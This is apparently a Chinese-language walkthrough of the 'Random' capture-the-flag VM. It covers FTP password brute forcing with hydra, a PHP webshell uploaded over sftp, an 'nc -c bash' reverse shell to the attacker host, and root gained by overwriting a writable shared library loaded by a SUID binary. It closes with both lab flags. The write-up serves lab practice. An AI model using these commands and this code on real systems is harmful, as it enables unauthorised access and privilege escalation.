# Random

:::note

[Linux VM] [Tested on VirtualBox] created by || sml

⏲️ Release Date // 2020-10-19

✔️ MD5 // 594d83108b972529c3d03abf5249febc

☠ Root // 34

💀 User // 38

📝Notes //
Hack and Fun. Tested on Virtualbox.

:::

## 靶机启动

靶机 IP

```plaintext
192.168.56.112
```

## nmap 信息搜集

```plaintext
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr--    2 1001     33           4096 Oct 19  2020 html
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.56.102
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 09:0e:11:1f:72:0e:6c:10:18:55:1a:73:a5:4b:e5:64 (RSA)
|   256 c0:9f:66:34:56:1d:16:4a:32:ad:25:0c:8b:a0:1b:5a (ECDSA)
|_  256 4c:95:57:f4:38:a3:ce:ae:f0:e2:a6:d9:71:42:07:c5 (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Site doesn't have a title (text/html).
```

## ftp 匿名登陆

```bash
ftp> ls -lah
229 Entering Extended Passive Mode (|||56972|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        113          4096 Oct 19  2020 .
drwxr-xr-x    3 0        113          4096 Oct 19  2020 ..
drwxr-xr--    2 1001     33           4096 Oct 19  2020 html
```

存在一个 `html` 目录，但是无法进入

## web 服务

```html
<pre>
#########################WARNING##########################
eleanor, i disabled your ssh access.
Take care.
-alan
##########################################################
</pre>
```

由于 SSH 服务被禁用，尝试爆破 ftp

```bash
┌─[randark@parrot]─[~/tmp]
└──╼ $hydra -v -V -I -l eleanor -P /usr/share/wordlists/rockyou.txt 192.168.56.112 ftp
[21][ftp] host: 192.168.56.112   login: eleanor   password: ladybug
```

登陆上去之后，成功控制 ftp 服务，但是还是无法上传文件

```bash
ftp> ls -lah
229 Entering Extended Passive Mode (|||10520|)
150 Here comes the directory listing.
drwxr-xr--    2 1001     33           4096 Oct 19  2020 .
drwxr-xr-x    3 0        113          4096 Oct 19  2020 ..
-rw-r--r--    1 33       33            185 Oct 19  2020 index.html
226 Directory send OK.
ftp> put simple-backdoor.php
local: simple-backdoor.php remote: simple-backdoor.php
229 Entering Extended Passive Mode (|||59495|)
550 Permission denied.
```

更换为 sftp，成功上传文件

```bash
sftp> ls -lah
drwxr-xr-x    ? 0        113          4.0K Oct 20  2020 .
drwxr-xr-x    ? 0        113          4.0K Oct 20  2020 ..
drwxr-xr--    ? 1001     33           4.0K Oct 20  2020 html
sftp> cd html
sftp> put simple-backdoor.php
Uploading simple-backdoor.php to /html/simple-backdoor.php
simple-backdoor.php
```

调用 webshell

```plaintext title="http://192.168.56.112/simple-backdoor.php?cmd=whoami"
www-data
```

## User - www-data

```bash
# http://192.168.56.112/simple-backdoor.php?cmd=nc+-c+bash+192.168.56.102+9999
┌─[randark@parrot]─[~/tmp]
└──╼ $pwncat-cs -lp 9999
[17:45:29] Welcome to pwncat 🐈!
[17:45:53] received connection from 192.168.56.112:56462
[17:45:54] 192.168.56.112:56462: registered new host w/ db
(local) pwncat$ back
(remote) www-data@random:/srv/ftp/html$ whoami
www-data
```

### 环境探测

```plaintext title="ls -lah /home/alan/"
total 56K
drwxr-xr-x 2 alan alan 4.0K Oct 19  2020 .
drwxr-xr-x 4 root root 4.0K Oct 19  2020 ..
-rw------- 1 alan alan   52 Oct 19  2020 .Xauthority
-rw-r--r-- 1 alan alan  220 Oct 19  2020 .bash_logout
-rw-r--r-- 1 alan alan 3.5K Oct 19  2020 .bashrc
-rw-r--r-- 1 alan alan  807 Oct 19  2020 .profile
-rw------- 1 alan alan  162 Oct 19  2020 note.txt
-rwsr-sr-x 1 root root  17K Oct 19  2020 random
-rw-r--r-- 1 root root   19 Oct 19  2020 root.h
-rw-r--r-- 1 root root 1.6K Oct 19  2020 rooter.o
```

发现一个 suid 程序，尝试执行

```bash
(remote) www-data@random:/home/alan$ ./random
Segmentation fault
```

下载下来分析

## `random` 程序逆向分析

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  time_t v3; // rdi
  int v5; // [rsp+1Ch] [rbp-4h]

  v5 = atoi(argv[1]);
  v3 = time(0LL);
  srand(v3);
  if (v5 == rand() % 9 + 1 )
    makemeroot(v3);
  else
    puts("Wrong number");
  return 0;
}
```

那简单，由于 `rand() % 9 + 1` 的限制，直接疯狂运行，总有能对的上的时候

```bash
(remote) www-data@random:/home/alan$ ./random 1
SUCCESS!! But I need to finish and implement this function
```

尝试分析这个程序的链接库

```bash
(remote) www-data@random:/home/alan$ ldd random
        linux-vdso.so.1 (0x00007ffd259e8000)
        librooter.so => /lib/librooter.so (0x00007f23db669000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f23db4a8000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f23db67a000)
```

经过探测，`/lib/librooter.so` 这个链接库可控，于是可以尝试覆盖

```c
#include <stdlib.h>

void makemeroot()
{
        setuid(0);
        setgid(0);
        system("/bin/bash");
}
```

:::warning

远程靶机环境中的 `ld` 有问题，会出现

```bash
(remote) www-data@random:/tmp$ gcc -shared shell.c -o /lib/librooter.so
shell.c: In function 'makemeroot':
shell.c:5:2: warning: implicit declaration of function 'setuid'; did you mean 'setenv'? [-Wimplicit-function-declaration]
  setuid(0);
  ^~~~~~
  setenv
shell.c:6:2: warning: implicit declaration of function 'setgid'; did you mean 'setenv'? [-Wimplicit-function-declaration]
  setgid(0);
  ^~~~~~
  setenv
collect2: fatal error: cannot find 'ld'
compilation terminated.
```

建议使用本地编译好的结果进行上传

:::

然后继续尝试运行 `random` 程序

```bash
(remote) www-data@random:/home/alan$ ./random 8
root@random:/home/alan# whoami
root
```

:::note

有个问题，这怎么就直接提权到 root 了，这不太科学。。。

:::

## User - root

### flag- user

```bash
root@random:/home/eleanor# cat user.txt
ihavethapowah
```

### flag - root

```bash
root@random:/root# cat root.txt
howiarrivedhere
```
